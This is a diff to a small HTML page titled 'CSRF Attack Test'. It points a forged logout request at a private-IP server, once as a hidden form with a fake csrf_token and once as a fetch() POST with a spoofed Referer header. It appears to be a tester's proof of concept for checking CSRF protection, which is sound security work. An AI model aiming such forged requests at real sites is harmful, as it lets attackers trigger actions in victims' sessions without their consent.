@@ -7,20 +7,20 @@
 </head>
 <body>
     <h1>CSRF Attack Test</h1>
-    <form action="https://server.ibdm.local.ifri/auth/logout" method="POST">
+    <form action="https://172.20.101.145:8443/auth/logout" method="POST">
         <input type="hidden" name="csrf_token" value="fake_token">
         <button type="submit">Logout</button>
     </form>
-    <button onclick="forgeRequestWithOutReferer">LogoutJSWithReferer</button>
+    <button onclick="forgeRequestWithoutReferer">LogoutJSWithReferer</button>
     <script>
-        function forgeRequestWithOutReferer() {
+        function forgeRequestWithoutReferer() {
             fetch(
-                'https://server.ibdm.local.ifri/auth/logout',
+                'https://172.20.101.145:8443/auth/logout',
                 {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
-                        'Referer': 'https://server.ibdm.local.ifri/auth/logout'
+                        'Referer': '172.20.101.145'
                     },
                     body: JSON.stringify({
                     })
